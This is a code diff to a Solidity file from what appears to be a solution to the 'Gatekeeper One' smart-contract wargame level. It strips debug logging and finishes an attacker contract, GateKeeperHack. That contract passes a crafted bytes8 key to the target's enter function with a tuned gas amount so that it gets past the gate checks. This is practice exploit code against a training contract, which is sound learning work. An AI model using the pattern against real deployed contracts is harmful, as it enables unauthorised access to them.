@@ -2,7 +2,6 @@
 pragma solidity ^0.6.0;
 
 import "@openzeppelin/contracts/math/SafeMath.sol";
-import "hardhat/console.sol";
 
 contract GatekeeperOne {
     using SafeMath for uint256;
@@ -44,10 +43,6 @@ contract GatekeeperOne {
         entrant = tx.origin;
         return true;
     }
-
-    function testGateOne() public {
-        console.log(msg.sender != tx.origin);
-    }
 }
 
 contract GateKeeperHack {
@@ -58,10 +53,10 @@ contract GateKeeperHack {
         gateKeeper = GatekeeperOne(_gateKeeper);
     }
 
-    function tryEnter(bytes8 _gateKey) public {
-        console.log(gasleft());
-        console.log(uint256(0).mod(8191));
-        gateKeeper.testGateOne();
-        // gateKeeper.enter(bytes8(_gateKey));
+    function tryEnter(uint64 testKey) public {
+        bytes8 _gateKey = bytes8(testKey);
+        address(gateKeeper).call{gas: 60150}(
+            abi.encodeWithSignature("enter(bytes8)", _gateKey)
+        );
     }
 }
